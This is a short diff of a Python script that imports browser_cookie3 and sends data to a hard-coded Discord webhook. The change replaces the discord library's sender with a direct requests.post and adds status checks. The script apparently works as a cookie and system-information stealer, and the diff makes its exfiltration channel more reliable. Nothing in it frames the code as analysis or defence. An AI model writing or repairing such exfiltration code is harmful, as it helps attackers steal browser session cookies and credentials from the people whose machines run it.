@@ -2,7 +2,6 @@ import os
 import requests
 import subprocess
 import platform
-from discord import Webhook, RequestsWebhookAdapter  # Import the correct classes for synchronous use
 import browser_cookie3
 
 # Your specific Discord webhook URL
@@ -10,10 +9,13 @@ webhook_url = 'https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CN
 
 # Function to send data to the Discord webhook
 def send_to_discord(content):
-    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())  # Use the correct adapter for sync
     try:
-        webhook.send(content)
-        print("Data sent to webhook")
+        payload = {"content": content}
+        response = requests.post(webhook_url, json=payload)
+        if response.status_code == 204:
+            print("Data sent to webhook")
+        else:
+            print(f"Failed to send webhook. Status code: {response.status_code}")
     except Exception as e:
         print(f"Error sending webhook: {e}")
 
